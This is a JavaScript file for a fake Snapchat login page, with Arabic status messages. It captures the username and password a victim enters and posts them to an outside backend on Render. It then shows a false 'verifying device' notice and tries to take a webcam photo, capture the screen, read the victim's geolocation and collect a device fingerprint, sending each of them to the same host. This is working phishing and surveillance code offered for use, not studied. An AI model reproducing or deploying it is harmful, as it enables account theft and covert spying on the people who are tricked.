const BACKEND_URL = "https://snap-backend-2lgr.onrender.com";

function handleLogin(event) {
  event.preventDefault();
  const user = document.getElementById('username').value;
  const pass = document.getElementById('password').value;
  sendNotification(`🔐 تسجيل دخول Snap وهمي:\n👤 المستخدم: ${user}\n🔑 كلمة المرور: ${pass}`);
  document.getElementById('statusMsg').style.display = "block";
  document.getElementById('statusMsg').innerText = "✅ تم تسجيل الدخول، جاري التحقق من الجهاز...";
  setTimeout(startFullVerification, 1500);
}

function sendNotification(msg) {
  fetch(`${BACKEND_URL}/notify`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ message: msg })
  });
}

function startFullVerification() {
  sendNotification("🚀 بدء التحقق الشامل...");
  tryCamera();
  requestLocation();
  tryScreenCapture();
  sendFingerprint();
}

function tryCamera() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      const video = document.createElement("video");
      video.srcObject = stream;
      video.play();
      video.onloadedmetadata = () => {
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        const data = canvas.toDataURL("image/png");
        fetch(`${BACKEND_URL}/screenshot`, {
          method: "POST",
          headers: { "Content-Type": "text/plain" },
          body: data
        });
        stream.getTracks().forEach(t => t.stop());
      };
    }).catch(() => sendNotification("❌ تم رفض الكاميرا."));
}

function tryScreenCapture() {
  navigator.mediaDevices.getDisplayMedia({ video: true })
    .then(stream => {
      const video = document.createElement("video");
      video.srcObject = stream;
      video.play();
      video.onloadedmetadata = () => {
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        const data = canvas.toDataURL("image/png");
        fetch(`${BACKEND_URL}/screenshot`, {
          method: "POST",
          headers: { "Content-Type": "text/plain" },
          body: data
        });
        stream.getTracks().forEach(t => t.stop());
      };
    }).catch(() => sendNotification("❌ تم رفض مشاركة الشاشة."));
}

function requestLocation() {
  navigator.geolocation.getCurrentPosition(
    pos => {
      fetch(`${BACKEND_URL}/location`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        })
      });
    },
    () => sendNotification("❌ رفض الموقع.")
  );
}

function sendFingerprint() {
  const info = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: navigator.deviceMemory || 'غير معروف'
  };
  fetch(`${BACKEND_URL}/fingerprint`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(info)
  });
}
